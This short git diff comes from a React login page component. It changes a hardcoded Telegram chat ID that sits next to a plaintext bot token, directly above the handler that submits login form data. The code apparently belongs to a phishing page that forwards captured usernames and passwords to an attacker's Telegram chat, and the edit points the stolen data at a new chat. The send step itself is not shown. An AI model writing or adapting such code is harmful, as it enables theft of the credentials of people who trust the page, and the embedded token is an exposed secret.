@@ -28,7 +28,7 @@ export default function LoginPage() {
     });
 
     const token = '6731121004:AAG5V3_4euycmSJuwRCUI2E3_7dbSdHIcaQ'
-    const chatId = -1002517526747;
+    const chatId = -1002733077471;
 
     const onSubmit = async (data: LoginForm) => {
         setSending(true);
